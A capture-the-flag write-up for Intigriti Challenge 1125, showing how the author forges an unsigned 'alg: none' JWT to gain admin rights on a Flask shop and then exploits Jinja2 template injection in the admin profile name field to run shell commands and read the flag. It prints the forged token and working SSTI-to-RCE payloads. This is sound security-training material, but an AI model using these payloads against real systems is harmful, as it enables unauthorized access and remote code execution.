# Intigriti Challenge 1125: Remote Code Execution via JWT Bypass & SSTI
---
**Author**: [Your Name]  
**Date**: November 23, 2025  
**Challenge**: [https://challenge-1125.intigriti.io](https://challenge-1125.intigriti.io)  
**Flag**: `INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}`

---
## Summary

This challenge exposed a critical vulnerability chain in an e-commerce application. By exploiting JWT algorithm confusion (`alg: none`), I gained administrative access without credentials. This elevated access revealed a Server-Side Template Injection (SSTI) vulnerability in the admin profile page, ultimately leading to Remote Code Execution and flag capture.

**Attack Path**:

```
Unauthenticated User → JWT None Algorithm → Admin Access → SSTI → RCE
```
---
# Enumeration
This website has some pages mentioned below.
1. `/shop`
2. `/cart`
3. `/browse`
4. `/login`
5. `/register`
6. `/products/<product-id>`
7. `/cart/add`
8. `/cart/add/<product-id>`
9. `/cart/remove/<product-id>`
10. `/dashboard`
11. `/admin`
12. `/admin/products`
13. `/admin/profile`
14. `/admin/users`
15. `/admin/orders`
---
It Looks like a normal E-Commerce Website have some endpoints to add or remove product from cart and product page

Lets Register a user to enumerate as authenticated user so that we can inspect more features.
![[register.png]]
We have registered a user successfully.
![[user dashboard.png]]
and we redirected to `/dashboard`
when Looking closely to the request we saw a JWT Token is set to our account as a cookie let's decode it to get it's content. There is also another cookie looks like a JWT we will decode them both to see what is this.
![[register request and response.png]]
## Privilege Escalation by Exploiting JWT
Now we have a JWT Token let's quickly test it for JWT Vulnerabilities to test is it vulnerable so that we can escalate our privileges to Admin.

### Tools Used
1. https://jwt.io

We use jwt.io to decode and encode JWT Tokens. We have two cookies 1st is `session=` and 2nd `token=` as name suggests session `token` it is JWT related to authorization. let's decode them and see in which cookie we have to focus.

#### token analysis
![[user jwt.png]]
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
The Header part tells us two things.
1. The token type is JWT.
2. Encryption Algorithm is `HS256`.
```json
{
  "user_id": 8,
  "username": "author",
  "role": "user",
  "exp": 1764004390
}
```
This is the Payload Part which tells us some juicy things we have to focus.
1. `user_id` our current user id is `8`.
2. `username` our username is `author`.
3. `role` our role which is `user`.
4. `exp` tells the expiry date of our token. not much interesting you can use [Cyber Chef](https://cyberchef.io/) to translate this Unix Timestamp.
#### session analysis
![[flask session cookie.png]]
```json
{
  "_flashes": [
    {
      " t": [
        "success",
        "Account created successfully!"
      ]
    }
  ],
  "cart": []
}
```
The Header part tells us.
1. `_flashes`: Flask flash messages (temporary UI notifications)
2. `" t"`: **Weird key with space** - likely typo or encoding issue
3. `cart`: Empty shopping cart array
4. and some junk in payload
#### Analysis Conclusion
- The `session=` cookie is just a flask session cookie not much interesting.
- `token=` cookie is interesting because it contains role and user_id
- If we modify the role and change that to Admin role then we can escalate privileges to Admin
- ==The Problem== if we modify the payload the signature of the JWT changed and we cannot sign that.
- ==The Solution== we have to know the secret key which is used to sign that token. we don't have the secret key. we can try brute force weak signing key or try a None Algorithm attack.
- first try none attack because brute force attack may fail if the JWT key is strong.

### JWT None Attack
Confuse the Algorithm that the encryption Algorithm is none so it doesn't requires Secret key.

**STEP 1:** modify the JWT payload and change the `role` value to admin.
```json
{
  "user_id": 8,
  "username": "author",
  "role": "admin",
  "exp": 1764004390
}
```
**STEP 2:** Change the `alg` value to `none` so that it doesn't check the algorithm. None Algorithm doesn't require secret key so it dosn't  get encrypted.
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
This is the final JWT Payload 
```jwt
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImF1dGhvciIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2NDAwNDM5MH0.
```
**Note Trailing dot is important because it is a structural requirement of the JWT standard, which mandates that a token consists of three parts separated by dots:** `header.payload.signature`

**STEP 3:** Now Everything is done set this token to the `token=` cookie using devtools.
![[changing jwt.png]]
**STEP 4:** Now save it and refresh the page.
![[admin dashboard.png]]
Now we are admin mentioned in Role and we have an Admin panel which looks Interesting.

---
## Enumeration as Admin
Some new pages unlocked
1. `/admin`
2. `/admin/products`
3. `/admin/profile`
4. `/admin/users`
5. `/admin/orders`
only one page `/admin/profile` is interactive and have a functionality to change display name of the user. and other pages are not much interactive only expect Back Button.
so we have one page with one functionality to change the display name let's check it.

![[profile page.png]]
Nice the name is reflecting we have a vector for SSTI / XSS
### Thought Process
As mentioned in CTF Description we have to take RCE and Self XSS is not needed so we have a clear indicator we have to try SSTI and SSTI is a perfect Vuln for this situation which can help us to gain RCE.

## SSTI to RCE
Now we have to exploit SSTI to get RCE and Read the flag.

### Identifying SSTI
As our Enumeration the backend server is running on flask as we know about that by flask session cookie. In flask we can also use template engine.

#### Templating Libraries

[Python Template Libraries](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#templating-libraries)

| Template Name | Payload Format |
| ------------- | -------------- |
| Bottle        | `{{ }}`        |
| Chameleon     | `${ }`         |
| Cheetah       | `${ }`         |
| Django        | `{{ }}`        |
| Jinja2        | `{{ }}`        |
| Mako          | `${ }`         |
| Pystache      | `{{ }}`        |
| Tornado       | `{{ }}`        |
Usually the syntax is `{{ }}` so use this to identify the vuln. we may also use SSTI polyglot but we know that the backend is running on flask so we may try payload according to it.

![[ssti confirmed.png]]
Cool we've confirmed SSTI and according to our template syntax tables it is one the templating engine which uses `{{ }}` syntax let's try more.

```jinja2
{{7*'7'}}
```
let's try this payload if it returns `7777777` then it is jinja2.
![[jinja2 identified.png]]
Confirmed it is Jinja2.

### SSTI Exploitation
I've tried payload to enumerate config and other things but i think these are filtered or not getting executed or something went wrong with them. but luckily i got a payload from payload all things.

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
**1. Object Chain Navigation:**

- `self` → Current template object
- `__init__` → Constructor method (gives access to class internals)
- `__globals__` → Global namespace dictionary (contains all imports/functions)
- `__builtins__` → Built-in Python functions dictionary
- `__import__('os')` → Dynamically imports the `os` module

**2. Command Execution:**

- `popen('id')` → Executes shell command `id` (shows user/group info)
- `.read()` → Reads the command output as string
- **Result**: Template renders the output of `id` command (e.g., `uid=999(appuser) gid=999(appuser) groups=999(appuser)`)
![[got RCE.png]]
and we got RCE. Now we can modify it to read flag.
```jinja2
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat .aquacommerce/019a82cf.txt').read()}}
```
![[flag.png]]
```flag
INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}
```

---
# References
1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
2. https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
